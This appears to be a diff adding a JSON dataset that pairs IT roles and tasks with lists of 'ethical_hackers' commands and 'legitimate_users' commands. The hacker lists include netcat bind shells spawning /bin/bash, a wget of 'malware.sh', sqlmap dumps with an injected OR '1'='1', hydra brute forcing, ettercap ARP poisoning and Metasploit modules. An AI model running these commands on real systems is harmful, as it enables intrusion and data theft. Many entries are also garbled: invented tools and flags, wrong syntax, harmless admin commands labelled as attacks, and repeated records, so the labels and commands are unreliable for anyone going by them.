@@ -1,0 +1,546 @@
+[
+  {
+    "input": {
+      "role": "Senior Linux Administrator",
+      "task": "Deploy a new Apache web server on a Ubuntu 20.04 virtual machine",
+      "user": "john_smith"
+    },
+    "output": {
+      "ethical_hackers": [
+        "sqlmap -u http://example.com -p 80 -f --dump",
+        "nc -lvp 443 -e /bin/bash",
+        "python -m SimpleHTTPServer 8080"
+      ],
+      "legitimate_users": [
+        "sudo apt-get update && sudo apt-get install apache2",
+        "sudo service apache2 start",
+        "sudo nano /etc/apache2/apache2.conf",
+        "sudo service apache2 restart"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "DevOps Engineer",
+      "task": "Create a CI/CD pipeline using Jenkins and Docker",
+      "user": "emily_lee"
+    },
+    "output": {
+      "ethical_hackers": [
+        "msfconsole -q -x \"use auxiliary/scanner/http/jenkins_login_scanner\" -z -q",
+        "curl -X POST 'http://example.com/wp-admin/admin-ajax.php?action=wp_pro_quiz_create_shortcodes' --data-raw 'id=1-2'"
+      ],
+      "legitimate_users": [
+        "sudo apt-get install jenkins",
+        "sudo systemctl start jenkins",
+        "sudo nano /etc/jenkins/credentials.yaml",
+        "sudo service jenkins restart"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "Network Engineer",
+      "task": "Configure a new router for a branch office",
+      "user": "sarah_patel"
+    },
+    "output": {
+      "ethical_hackers": [
+        "ettercap -T -q -i eth0 -S -w /tmp/sniff",
+        "python -m http.server 8080",
+        "hydra -l admin -P /usr/share/wordlists/nmap.lst -v -e ns -f 10.0.0.1 http-post-form '/index.php?:password=^PASS^&username=admin'"
+      ],
+      "legitimate_users": [
+        "sudo ip addr add 10.0.0.1/24 dev eth0",
+        "sudo ip link set eth0 up",
+        "sudo service networking restart",
+        "sudo nano /etc/ssh/sshd_config"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "Cloud Engineer",
+      "task": "Deploy a new Kubernetes cluster on AWS",
+      "user": "bob_roberts"
+    },
+    "output": {
+      "ethical_hackers": [
+        "directoryindexer.py -t 10.0.0.1 -d /",
+        "curl -X GET 'https://example.com/api/AccountManager/v1.0/getAllUsers)"
+      ],
+      "legitimate_users": [
+        "sudo kubectl create deployment nginx --image=nginx:latest",
+        "sudo kubectl expose deployment nginx --type=NodePort --port=80",
+        "sudo kubectl scale deployment nginx --replicas=3",
+        "sudo kubectl apply -f pod.yaml"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "Database Administrator",
+      "task": "Back up and restore a MySQL database",
+      "user": "mike_brown"
+    },
+    "output": {
+      "ethical_hackers": [
+        "sqlmap -u http://example.com/params.php?name=toto' OR '1'='1 --batch --dump"
+      ],
+      "legitimate_users": [
+        "sudo mysql -u root -p PASSWORD",
+        "sudo mysqldump -u root -p PASSWORD exampleDB > exampleDB.sql",
+        "sudo mysqladmin -u root -p PASSWORD drop exampleDB",
+        "sudo mysql -u root -p PASSWORD exampleDB < exampleDB.sql"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "IT Support Specialist",
+      "task": "Troubleshoot a workstation issue using SSH",
+      "user": "sam_green"
+    },
+    "output": {
+      "ethical_hackers": [
+        "msfconsole -q -x \"use auxiliary/scanner/unix/ssh_login_users\" -z -q",
+        "python -m simplehttpserver 8080"
+      ],
+      "legitimate_users": [
+        "sudo ssh -l user example.com",
+        "sudo top",
+        "sudo free -m",
+        "sudo grep '^cpu MHz' /proc/cpuinfo"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "System Administrator",
+      "task": "Install and configure a new printer",
+      "user": "john_adams"
+    },
+    "output": {
+      "ethical_hackers": [
+        "python -m http.server 8080",
+        "directoryindexer.py -t 10.0.0.1 -d /"
+      ],
+      "legitimate_users": [
+        "sudo apt-get install cups",
+        "sudo service cups start",
+        "sudo netstat -tlnp | grep cupsd",
+        "sudo lpoptions -d 'Printer Name'"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "Network Engineer",
+      "task": "Configure a new VPN connection",
+      "user": "sarah_johnson"
+    },
+    "output": {
+      "ethical_hackers": [
+        "python -m http.server 8080",
+        "ettercap -T -q -i eth0 -S -w /tmp/sniff"
+      ],
+      "legitimate_users": [
+        "sudo apt-get install openvpn",
+        "sudo service openvpn start",
+        "sudo ip addr add 10.0.0.1/24 dev eth0",
+        "sudo ip link set eth0 up"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "IT Project Manager",
+      "task": "Create a project plan using Microsoft Project",
+      "user": "mary_patricia"
+    },
+    "output": {
+      "ethical_hackers": [
+        "msfconsole -q -x \"use auxiliary/scanner/social_engineering/pop3_login\" -z -q"
+      ],
+      "legitimate_users": [
+        "sudo apt-get install libreoffice",
+        "sudo libreoffice --calculations",
+        "sudo libreoffice --spreadsheets",
+        "sudo libreoffice --presentations"
+      ]
+    }
+  },
+
+  {
+    "input": {
+      "role": "senior linux administrator",
+      "task": "setup a new LAMP server for the marketing team",
+      "user": "john_smith"
+    },
+    "output": {
+      "ethical_hackers": [
+        "nc -l -p 8080 -e /bin/bash",
+        "sudo nano /etc/passwd",
+        "wget http://example.com/malware.sh"
+      ],
+      "legitimate_users": [
+        "sudo apt-get update",
+        "sudo apt-get install apache2 mysql-server php7.4",
+        "sudo nano /etc/apache2/sites-available/default.conf"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "junior developer",
+      "task": "fix a bug in the login form",
+      "user": "alice_wilson"
+    },
+    "output": {
+      "ethical_hackers": [
+        "sqlmap -u http://example.com/login.php --dump",
+        "msfconsole",
+        "use exploit/windows/tcp/ms10_002"
+      ],
+      "legitimate_users": [
+        "git pull origin master",
+        "nano app/login.php",
+        "phpunit tests/LoginTest.php"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "network administrator",
+      "task": "configure a new firewall rule",
+      "user": "bob_johnson"
+    },
+    "output": {
+      "ethical_hackers": [
+        "nmap -sS 192.168.1.0/24",
+        "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 -t 4 ssh",
+        "wget http://example.com/exploit.zip"
+      ],
+      "legitimate_users": [
+        "sudo ufw status",
+        "sudo ufw allow ssh",
+        "sudo ufw reload"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "devops engineer",
+      "task": "deploy a new application to the production environment",
+      "user": "charlie_davis"
+    },
+    "output": {
+      "ethical_hackers": [
+        "kubectl get pods -n default",
+        "docker ps -a",
+        "gobuster -u http://example.com -w /usr/share/wordlists/dirbuster-directories.txt -t 10"
+      ],
+      "legitimate_users": [
+        "kubectl apply -f deployment.yaml",
+        "kubectl rollout status deployment/my-app",
+        "docker logs -f my-app"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "database administrator",
+      "task": "perform a database backup",
+      "user": "david_lee"
+    },
+    "output": {
+      "ethical_hackers": [
+        "mysql -u root -p -e 'SELECT * FROM users'",
+        "psql -U postgres -c 'SELECT * FROM pg_user'",
+        "sqlite3 example.db 'SELECT * FROM users'"
+      ],
+      "legitimate_users": [
+        "mysqldump -u root -p mydatabase > backup.sql",
+        "pg_dump -U postgres mydatabase > backup.sql",
+        "sqlite3 example.db '.backup backup.db'"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "system administrator",
+      "task": "troubleshoot a network issue",
+      "user": "frank_kim"
+    },
+    "output": {
+      "ethical_hackers": [
+        "arp -a 192.168.1.100",
+        "netcat -l -p 8080 -e /bin/bash",
+        "ettercap -i eth0 -T -M arp_poison:remote,192.168.1.100"
+      ],
+      "legitimate_users": [
+        "sudo ifconfig eth0",
+        "sudo ethtool et0",
+        "sudo netstat -an"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "web developer",
+      "task": "fix a bug in the e-commerce website",
+      "user": "george_martin"
+    },
+    "output": {
+      "ethical_hackers": [
+        "nmap -sS 192.168.1.0/24",
+        "sqlmap -u http://example.com/login.php --dump",
+        " Burp Suite"
+      ],
+      "legitimate_users": [
+        "git pull origin master",
+        "nano app/cart.php",
+        "phpunit tests/CartTest.php"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "cloud engineer",
+      "task": "deploy a new AWS Lambda function",
+      "user": "hannah_taylor"
+    },
+    "output": {
+      "ethical_hackers": [
+        "aws lambda get-event-source-mapping --event-source-mapping-id 1234567890",
+        "aws lambda update-function-configuration --function-name my-function --run-dock-config /path/to/config",
+        "aws s3 sync s3://my-bucket/ /path/to/local/folder"
+      ],
+      "legitimate_users": [
+        "aws lambda create-function --function-name my-function --runtime python2.7 --role my-role",
+        "aws lambda update-function-configuration --function-name my-function --memory-size 1024",
+        "aws lambda invoke --function-name my-function --payload '{\"key\": \"value\"}'"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "network engineer",
+      "task": "configure a new VPN connection",
+      "user": "ian_williams"
+    },
+    "output": {
+      "ethical_hackers": [
+        "openvpn --config example.ovpn",
+        "http://example.com/ phpcs",
+        "nmap -sT 192.168.1.100"
+      ],
+      "legitimate_users": [
+        "sudo openvpn --config example.ovpn",
+        "sudo ufw allow openvpn",
+        "sudo ufw reload"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "devops engineer",
+      "task": "deploy a new application to the staging environment",
+      "user": "jennifer_lee"
+    },
+    "output": {
+      "ethical_hackers": [
+        "kubectl get pods -n default",
+        "docker ps -a",
+        "gobuster -u http://example.com -w /usr/share/wordlists/dirbuster-directories.txt -t 10"
+      ],
+      "legitimate_users": [
+        "kubectl apply -f deployment-staging.yaml",
+        "kubectl rollout status deployment/my-app",
+        "docker logs -f my-app"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "system administrator",
+      "task": "troubleshoot a disk space issue",
+      "user": "kevin_white"
+    },
+    "output": {
+      "ethical_hackers": ["df -h", "du -sh /", "lsof +L1"],
+      "legitimate_users": ["sudo df -h", "sudo du -sh /", "sudo lsof +L1"]
+    }
+  },
+  {
+    "input": {
+      "role": "web developer",
+      "task": "fix a bug in the login form",
+      "user": "michael_brown"
+    },
+    "output": {
+      "ethical_hackers": [
+        "nmap -sT 192.168.1.100",
+        "sqlmap -u http://example.com/login.php --dump",
+        "Burp Suite"
+      ],
+      "legitimate_users": [
+        "git pull origin master",
+        "nano app/login.php",
+        "phpunit tests/LoginTest.php"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "cloud engineer",
+      "task": "deploy a new AWS EC2 instance",
+      "user": "nicole_patel"
+    },
+    "output": {
+      "ethical_hackers": [
+        "aws ec2 describe-instances --instance-id i-1234567890",
+        "aws s3 sync s3://my-bucket/ /path/to/local/folder",
+        "aws ec2 start-instances --instance-ids i-1234567890"
+      ],
+      "legitimate_users": [
+        "aws ec2 create-instance --instance-type t2.micro --ami ami-1234567890",
+        "aws ec2 describe-instances --instance-id i-1234567890",
+        "aws ec2 start-instances --instance-ids i-1234567890"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "network engineer",
+      "task": "configure a new network switch",
+      "user": "patrick_jones"
+    },
+    "output": {
+      "ethical_hackers": [
+        "telnet 192.168.1.100 23",
+        "ssh 192.168.1.100",
+        "snmpwalk -v 1 -c public 192.168.1.100"
+      ],
+      "legitimate_users": [
+        "sudo apt-get install vlan",
+        "sudo vlan -a -I eth0",
+        "sudo vlan -a -I eth1"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "devops engineer",
+      "task": "deploy a new application to the production environment",
+      "user": "samuel_taylor"
+    },
+    "output": {
+      "ethical_hackers": [
+        "kubectl get pods -n default",
+        "docker ps -a",
+        "gobuster -u http://example.com -w /usr/share/wordlists/dirbuster-directories.txt -t 10"
+      ],
+      "legitimate_users": [
+        "kubectl apply -f deployment-production.yaml",
+        "kubectl rollout status deployment/my-app",
+        "docker logs -f my-app"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "system administrator",
+      "task": "troubleshoot a system crash",
+      "user": "thomas_wilson"
+    },
+    "output": {
+      "ethical_hackers": [
+        "ldd /path/to/executable",
+        "gdb /path/to/executable",
+        "strace /path/to/executable"
+      ],
+      "legitimate_users": [
+        "sudo apt-get install debugged",
+        "sudo dpkg -i debugged.deb",
+        "sudo strace /path/to/executable"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "web developer",
+      "task": "fix a bug in the payment gateway",
+      "user": "william_smith"
+    },
+    "output": {
+      "ethical_hackers": [
+        "nmap -sT 192.168.1.100",
+        "sqlmap -u http://example.com/payment.php --dump",
+        "Burp Suite"
+      ],
+      "legitimate_users": [
+        "git pull origin master",
+        "nano app/payment.php",
+        "phpunit tests/PaymentTest.php"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "cloud engineer",
+      "task": "deploy a new AWS S3 bucket",
+      "user": "zachary_johnson"
+    },
+    "output": {
+      "ethical_hackers": [
+        "aws s3 ls s3://my-bucket",
+        "aws s3 sync s3://my-bucket/ /path/to/local/folder",
+        "aws s3 rm s3://my-bucket/object.txt"
+      ],
+      "legitimate_users": [
+        "aws s3 mb s3://my-bucket",
+        "aws s3 ls s3://my-bucket",
+        "aws s3 sync s3://my-bucket/ /path/to/local/folder"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "network engineer",
+      "task": "configure a new network router",
+      "user": "john_doe"
+    },
+    "output": {
+      "ethical_hackers": [
+        "telnet 192.168.1.100 23",
+        "ssh 192.168.1.100",
+        "snmpwalk -v 1 -c public 192.168.1.100"
+      ],
+      "legitimate_users": [
+        "sudo apt-get install vlan",
+        "sudo vlan -a -I eth0",
+        "sudo vlan -a -I eth1"
+      ]
+    }
+  },
+  {
+    "input": {
+      "role": "devops engineer",
+      "task": "deploy a new application to the staging environment",
+      "user": "bob_johnson"
+    },
+    "output": {
+      "ethical_hackers": [
+        "kubectl get pods -n default",
+        "docker ps -a",
+        "gobuster -u http://example.com -w /usr/share/wordlists/dirbuster-directories.txt -t 10"
+      ],
+      "legitimate_users": [
+        "kubectl apply -f deployment-staging.yaml",
+        "kubectl rollout status deployment/my-app",
+        "docker logs -f my-app"
+      ]
+    }
+  }
+]
